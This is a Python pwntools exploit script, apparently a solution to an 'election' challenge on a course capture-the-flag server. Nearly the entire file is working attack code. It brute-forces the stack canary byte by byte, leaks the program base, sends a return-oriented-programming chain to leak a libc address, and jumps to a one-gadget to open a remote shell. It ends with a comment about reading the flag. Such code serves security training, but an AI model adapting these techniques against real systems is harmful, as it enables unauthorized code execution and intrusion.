from pwn import *
#context.log_level = 'debug'

#execve : 0x0e4e30s
#0x7f03fabdd6d3 print
#0x7f03fabe0435 system
#0x7f03fabe111c
#r=process('./election' )
sh="A"*184
#gdb.attach(r)
r=remote('edu-ctf.csie.org',10180)
canary=0
shcanary=sh
strcanary=""
count=0
base=0
times=1
while count<8:
	r.sendlineafter(">\n","2")
	r.sendafter(": ",sh)
	r.sendlineafter(">\n","1")
	send=shcanary+chr(canary)
	r.sendafter(": ",send)	
	recv=r.recvuntil('\x0a',drop=True)
	if recv=="Invalid token.":
		canary+=1
	else:
		count+=1
		shcanary=shcanary+chr(canary)
		strcanary+=chr(canary)
		canary=0
		r.sendlineafter(">\n","3")
print("AAAA")
while count<16:
	r.sendlineafter(">\n","2")
	r.sendafter(": ",sh)
	r.sendlineafter(">\n","1")
	send=shcanary+chr(canary)
	r.sendafter(": ",send)	
	recv=r.recvuntil('\x0a',drop=True)
	if recv=="Invalid token.":
		canary+=1
	else:
		count+=1
		shcanary=shcanary+chr(canary)
		base=base+canary*times
		canary=0
		r.sendlineafter(">\n","3")
		times*=256

base-=0x1140
print(hex(base))
payload="\x00"*232
payload+=strcanary
payload+=p64(base+0x202158)
payload+=p64(base+0xbe9)
payload1=payload[0:254]
for i in range(25):
	r.sendlineafter(">\n","2")
	r.sendafter(": ",sh)
	r.sendlineafter(">\n","1")
	r.sendafter(": ",sh)
	for j in range(10):
		r.sendlineafter(">\n","1")
		r.sendlineafter(": ","6")
	r.sendlineafter(">\n","3")
s=p64(base+0x11a3)
s+=p64(base+0x201fe0)
s+=p64(base+0x940)
s+=p64(base+0x119a)#read
s+=p64(0)
s+=p64(1)
s+=p64(base+0x201fb0)
s+=p64(0)
s+=p64(base+0x2021f0)
s+=p64(0x80)
s+=p64(base+0x1180)

r.sendlineafter(">\n","2")
r.sendafter(": ",s)
r.sendlineafter(">\n","1")
r.sendafter(": ",s)
for j in range(5):
	r.sendlineafter(">\n","1")
	r.sendlineafter(": ","6")
	
r.sendlineafter(">\n","2")
r.sendlineafter(": ","6")
r.sendafter(": ",payload1)
r.sendlineafter(">\n","3")
startmain_addr=u64(r.recvuntil('\x0a',drop=True)[0:].ljust(8,'\x00'))
st=str(hex(startmain_addr))
print(st)
gadget_addr=startmain_addr-0x21ab0+0x4f322
print(p64(gadget_addr))
payload=p64(gadget_addr)
payload+="\x00"*60
r.send(payload)

r.interactive()
#cat /home/shellc0de/flag
